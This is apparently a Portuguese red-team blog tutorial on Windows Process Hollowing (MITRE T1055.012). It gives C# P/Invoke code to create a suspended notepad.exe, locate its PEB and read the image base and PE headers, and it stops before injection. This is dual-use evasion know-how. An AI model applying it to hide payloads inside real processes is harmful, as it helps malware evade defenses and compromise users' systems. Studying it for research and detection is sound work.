---
title: "Process Hollowing: uma análise interna."
date: 2024-11-09 00:00:00 +0800
categories: [Windows, Process Injection, Shellcode]
tags: [Red Team]
math: true
---

![Desktop View](https://i.imgur.com/nQcUqAA.png){: width="400" height="400" }

O Windows não deixa a desejar quando o assunto é Process Injection. Diferentes técnicas de injeção de shellcodes em processos locais/remotos são descobertas e publicadas para pesquisa. Dentre elas, uma que me chamou bastante atenção, e que é o assunto que abordaremos hoje, é a técnica de **Process Hollowing**!

O interessante dessa técnica é que ela vai além do funcionamento básico de uma injeção de shellcode. Em vez de apenas alocar memória no processo remoto e inserir o shellcode, exploraremos a estrutura fundamental de um executável PE para abusarmos de atributos importantes para a execução do nosso código.

## Introdução

De acordo com o MITRE ATT&CK, a técnica [T1055.012](https://attack.mitre.org/techniques/T1055/012/) consiste em "adversários podem injetar código malicioso em processos suspensos e esvaziados para evadir defesas baseadas em processos". Simplificadamente, o ataque ocorre com o seguinte workflow: 

![Desktop View](https://i.imgur.com/NKCa1rO.png)

Onde:

- `Hollowing de Processo`: Trata-se da etapa especial do ataque. O atacante irá realizar o "hollowing", ou o "esvaziamento" do conteúdo do processo.
- `Injeção de Shellcode`: É nesta etapa onde o invasor injeta o conteúdo do shellcode no campo esvaziado do processo.
- `Controle de Execução`: Ocorre quando o shellcode é executado.

Sem mais enrolação, partiremos para o código!

## CreateProcess

Primeiramente, vamos criar um novo processo "notepad.exe" suspenso. É este processo que será submetido ao ataque. Para isso, utilizamos a API "CreateProcess".

```csharp
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
private struct STARTUPINFO
{
	public Int32 cb;
	public string lpReserved;
	public string lpDesktop;
	public string lpTitle;
	public Int32 dwX;
	public Int32 dwY;
	public Int32 dwXSize;
	public Int32 dwYSize;
	public Int32 dwXCountChars;
	public Int32 dwYCountChars;
	public Int32 dwFillAttribute;
	public Int32 dwFlags;
	public Int16 wShowWindow;
	public Int16 cbReserved2;
	public IntPtr lpReserved2;
	public IntPtr hStdInput;
	public IntPtr hStdOutput;
	public IntPtr hStdError;
}

[StructLayout(LayoutKind.Sequential)]
private struct PROCESS_INFORMATION
{
	public IntPtr hProcess;
	public IntPtr hThread;
	public int dwProcessId;
	public int dwThreadId;
}

[DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
private static extern bool CreateProcess(
	string lpApplicationName,
	string lpCommandLine,
	IntPtr lpProcessAttributes,
	IntPtr lpThreadAttributes,
	bool bInheritHandles,
	uint dwCreationFlags,
	IntPtr lpEnvironment,
	string lpCurrentDirectory,
	[In] ref STARTUPINFO lpStartupInfo,
	out PROCESS_INFORMATION lpProcessInformation
);

static void Main()
{
	STARTUPINFO si = new STARTUPINFO();
	PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

	bool createProcessBool = CreateProcess(
		null,
		@"C:\Windows\System32\notepad.exe",
		IntPtr.Zero,
		IntPtr.Zero,
		false,
		0x00000004,
		IntPtr.Zero,
		null,
		ref si,
		out pi
	);

	if (createProcessBool == false)
	{
		Console.WriteLine("CreateProcess ERROR!");
		Console.WriteLine($"ERROR CODE: {Marshal.GetLastWin32Error()}");
		Environment.Exit(0);
	}

	else
	{
		Console.WriteLine(". CreateProcess SUCCESS!");
		Console.WriteLine($".. Process HANDLE: {pi.hProcess}");
		Console.WriteLine($"... Process THREAD: {pi.hThread} \n");
	}
}
```

>`CREATE_SUSPENDED (0x00000004)`: o valor que define o novo processo como suspenso. Para mais informações, veja esta [documentação](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags).
{: .prompt-info }

Executando o código acima, um novo processo "notepad.exe" será criado em modo suspenso. Podemos validá-lo abrindo o nosso gerenciador de tarefas.

<img src= "https://i.imgur.com/LU62o94.png" alt="Processo notepad.exe suspenso" style="border: 2px solid black;">

## NtQueryInformationProcess

Nosso próximo passo é obter o valor do PEB do processo recém-criado. Para isso, a API "NtQueryInformationProcess" desempenha esta função.

```csharp
private struct PROCESS_BASIC_INFORMATION
{
	public NTSTATUS ExitStatus;
	public IntPtr PebBaseAddress;
	public UIntPtr AffinityMask;
	public int BasePriority;
	public UIntPtr UniqueProcessId;
	public UIntPtr InheritedFromUniqueProcessId;
}

[DllImport("NTDLL.DLL", SetLastError=true)]
static extern NTSTATUS NtQueryInformationProcess(
	IntPtr hProcess,
	int pic,
	out PROCESS_BASIC_INFORMATION pbi,
	IntPtr cb,
	out int pSize
);

static void Main()
{
	PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
	NTSTATUS GetPebAddress = NtQueryInformationProcess(
		pi.hProcess,
		0,
		out pbi,
		(IntPtr.Size * 6),
		out int pSize
	);

	if (GetPebAddress != NTSTATUS.Success)
	{
		Console.WriteLine("NtQueryInformationProcess ERROR!");
		Console.WriteLine($"ERROR CODE: {GetPebAddress}");
		Environment.Exit(0);
	}

	else
	{
		Console.WriteLine($". NtQueryInformationProcess SUCCESS!");
		Console.WriteLine($".. Process PEB ADDRESS: 000000{pbi.PebBaseAddress.ToString("X")}");
	}
}
```

>O PEB (Process Environment Block) se trata de uma estrutura de dados que todo processo possui no Windows. Nesta estrutura, informações importantes sobre o processo em execução são armazenadas, como seu PID, localização de DLLs carregadas, caminho do executável, entre outros.
{: .prompt-info }

> Nas capturas de telas abaixo, você pode notar algumas diferenças de valores. Isso se dá ao fato de que a cada vez que eu executava o código, um novo processo notepad era criado. Consequentemente, os valores nas prints se diferem. Entretanto, a lógica permanece a mesma.
{: .prompt-warning }

Executando o código acima, obtemos o endereço PEB do executável. Para validarmos se de fato o endereço obtido está certo, podemos utilizar o famoso [WinDBG](https://learn.microsoft.com/pt-br/windows-hardware/drivers/debugger/) para compararmos os valores.

<img src= "https://i.imgur.com/8aMkBfy.png" alt="Comparando o PEB com o WinDBG" style="border: 2px solid black;">

Com o PEB em mãos, partiremos para uma tarefa importante da técnica: obter o `ImageBaseAddress`. Este atributo é obtido através do PEB e representa o endereço inicial onde o EXE é mapeado no PE. Rodando o comando `!peb` no WinDBG, podemos verificar que seu offset é no valor de `0x010`. 

<img src= "https://i.imgur.com/G99IQqi.png" alt="Offset do ImageBaseAddress" style="border: 2px solid black;">

Logo, para obtermos o `ImageBaseAddress`, basta somarmos o valor `0x010` ao endereço do PEB obtido anteriormente. O termo "offset" serve para identificar onde uma informação específica está localizada em relação a um ponto de referência dentro de uma região de memória.

Para acessar esta informação, basta somar os dois valores (ponto de referência + offset). Neste caso, o ponto de referência é o endereço PEB e o offset é de `0x010`. Logo, a fórmula ficaria como:

$$
\text{ImageBaseAddress} = 0000005A0C2DC000 + 0x010
$$

```csharp
IntPtr ImageBaseAddress = pbi.PebBaseAddress + 0x010;
Console.WriteLine($"... Process ImageBaseAddress: 000000{ImageBaseAddress.ToString("X")}\n");
```

## ReadProcessMemory

Agora, a próxima etapa é calcular alguns valores específicos relacionados ao processo. Primeiramente, faremos a obtenção do endereço base do processo. Para isso, é necessária operações de leitura na memória.

```csharp
byte[] arrayOne = new byte[0x8];
bool readProcessMemory_1 = ReadProcessMemory(
	pi.hProcess,
	ImageBaseAddress,
	arrayOne,
	arrayOne.Length,
	IntPtr.Zero
);

if (readProcessMemory_1 == true)
{
	IntPtr ImageBase = (IntPtr)(BitConverter.ToInt64(arrayOne, 0));
	Console.WriteLine($". Base Address: 000000{ImageBase.ToString("X")}");
}
```

>O valor de 8 bytes foi escolhido porque ele corresponde ao tamanho de um valor inteiro de 64 bits.
{: .prompt-info }

Feito isso, o ponteiro `ImageBase` será o responsável por armazenar o endereço base do processo em execução, obtido através do PEB. Podemos validar isso realizando uma comparação com o valor que é retornado no WinDBG. Para isso, basta executar o comando `lm`, listando todos os módulos carregados.

<img src= "https://i.imgur.com/UoaWPiB.png" alt="VA do ImageBaseAddress" style="border: 2px solid black;">

Nosso próximo passo é novamente realizar operações de leitura de memória. Porém, desta vez, repassando o próprio endereço armazenado no ponteiro `ImageBase`.

```csharp
byte[] arrayTwo = new byte[0x200];
bool readProcessMemory_2 = ReadProcessMemory(
	pi.hProcess,
	ImageBase,
	arrayTwo,
	arrayTwo.Length,
	IntPtr.Zero
);
```

>O valor de 512 bytes (0x200) foi escolhido porque ele corresponde ao tamanho necessário para ler a estrutura do PE.
{: .prompt-info }

Feito isso, partiremos para uma nova tarefa: calcular certos valores do PE. São eles:

- `e_lfanew`: é um capo de 4 bytes, e o último membro da estrutura DOS Header. Seu offset (`0x3C`) indica o início do NT Header.
- `Entrypoint RVA e VA`: Este é talvez o campo mais importante da estrutura `IMAGE_OPTIONAL_HEADER`. Nele está contido o endereço do ponto de entrada (entrypoint), abreviado EP, que é onde o código do programa deve começar.

>Para aprofundar-se em cabeçalhos do formato PE, recomendo a leitura [deste GitBook](https://mentebinaria.gitbook.io/engenharia-reversa/o-formato-pe/cabecalhos) do [Mente Binária](https://www.mentebinaria.com.br/).
{: .prompt-tip }

[comment]: <> (https://mentebinaria.gitbook.io/engenharia-reversa/o-formato-pe/cabecalhos/opcional)]
